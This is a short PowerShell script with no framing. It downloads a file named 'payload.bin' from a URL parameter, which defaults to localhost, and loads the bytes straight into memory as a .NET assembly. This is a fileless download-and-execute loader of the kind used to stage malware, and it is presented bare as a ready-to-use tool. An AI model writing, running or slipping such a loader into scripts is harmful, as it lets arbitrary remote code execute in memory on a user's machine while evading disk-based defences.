
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://127.0.0.1/payload.bin'
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
